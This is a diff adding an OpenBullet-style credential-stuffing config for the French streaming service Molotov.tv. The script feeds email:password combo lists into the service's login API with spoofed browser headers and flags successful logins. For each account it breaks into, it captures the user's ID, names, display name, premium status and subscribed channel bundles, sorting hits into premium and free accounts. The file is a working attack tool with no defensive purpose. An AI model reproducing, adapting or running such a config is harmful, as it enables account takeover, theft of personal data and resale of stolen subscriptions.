@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "Molotov.tv",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-11T13:03:47.9998899+02:00",
+  "AdditionalInfo": "",
+  "Author": "sp6off",
+  "Version": "1.3.6 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://fapi.molotov.tv/v3.1/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"grant_type\":\"password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: fapi.molotov.tv" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.molotov.tv/account/profile" 
+  HEADER "X-Molotov-Agent: {\"app_build\":1,\"app_id\":\"customer_area\",\"type\":\"desktop\",\"os\":\"windows\",\"manufacturer\":\"\",\"model\":\"\",\"brand\":\"\",\"serial\":\"\"}" 
+  HEADER "X-Molotov-Website: customer_area" 
+  HEADER "Origin: https://www.molotov.tv" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"type\":\"user\"" 
+  KEYCHAIN Failure OR 
+    KEY "Vos identifiants sont incorrects. Veuillez réessayer." 
+
+#ID_Utilisateur PARSE "<SOURCE>" LR "{\"id\":\"" "\"," -> CAP "Identifiant" 
+
+#Nom_Utilisateur PARSE "<SOURCE>" LR "\"first_name\":\"" "\"," -> CAP "Nom" 
+
+#Prénom_Utilisateur PARSE "<SOURCE>" LR "\"last_name\":\"" "\"," -> CAP "Prénom" 
+
+#Nom_Affiché PARSE "<SOURCE>" LR "\"display_name\":\"" "\",\"" -> CAP "Nom affiché" 
+
+#Vérif_Premium PARSE "<SOURCE>" LR "\"is_premium\":" "}" -> VAR "verifPremium" 
+
+#Remplacer_Premium FUNCTION Translate 
+  KEY "true" VALUE "Ce compte est Premium !" 
+  KEY "false" VALUE "Ce compte n'est pas Premium." 
+  "<verifPremium>" -> CAP "Premium" 
+
+#Check_Premium KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Premium>" Contains "Ce compte est Premium !" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Premium>" Contains "Ce compte n'est pas Premium." 
+
+#Vérif_Programmes_Payants PARSE "<SOURCE>" LR "\"has_paid_channels\":" ",\"" -> VAR "progpay" 
+
+#Remplacer_Programmes FUNCTION Translate 
+  KEY "true" VALUE "Programmes payants détectés." 
+  KEY "false" VALUE "Aucun programme payant." 
+  "<progpay>" -> CAP "Programmes payants ?" 
+
+#Programmes_Souscrits PARSE "<SOURCE>" LR "\"tv_bundles_subscribed\":[" "]," -> VAR "progSouscrits" "" " | sp6off rules !" 
+
+#Afficher_Programmes FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "\"25\"" VALUE "Pack Molotov classique" 
+  KEY "\"60\"" VALUE "Orange Cinéma Séries" 
+  "<progSouscrits>" -> CAP "Programmes souscrits" 
+
